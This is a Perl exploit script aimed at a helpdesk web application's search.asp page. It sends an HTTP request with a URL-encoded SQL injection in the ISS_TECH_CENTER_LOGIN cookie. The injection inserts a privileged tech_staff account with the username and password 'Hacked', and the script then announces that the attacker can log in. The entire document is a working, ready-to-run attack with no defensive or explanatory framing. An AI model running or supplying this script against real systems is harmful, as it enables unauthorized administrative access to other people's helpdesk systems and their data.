#!/usr/bin/perl

use IO::Socket;
use strict;

my $host = $ARGV[0];
my $Path = $ARGV[1];

if (($#ARGV+1) < 2)
{
print "iss_helpdesk.pl host path\n";
exit(0);
}

my $remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host, PeerPort => "80" );

unless ($remote) { die "cannot connect to http daemon on $host" }

my $sql = "; INSERT INTO tech_staff (tech_id, tech_password, tech_level, first_name, last_name, availability, show_dispatch_flag) VALUES ('Hacked', 'Hacked', 6, 'Hacked', 'Hacked', 1, 1); --";

$sql =~s/([^a-zA-Z0-9])/uc sprintf("%%%02x",ord($1))/eg;

my $http = "GET /$Path/search.asp HTTP/1.1
Host: $host
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040405 Firefox/0.8
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: close
Cookie: ISS_TECH_CENTER_LOGIN='+$sql;

";

print "HTTP: [$http]\n";
print $remote $http;
sleep(1);

while (<$remote>)
{
# print $_;
}
print "\n";

close($remote);

print "You can now logon using the tech username 'Hacked' with the password 'Hacked'\n";

exit(0);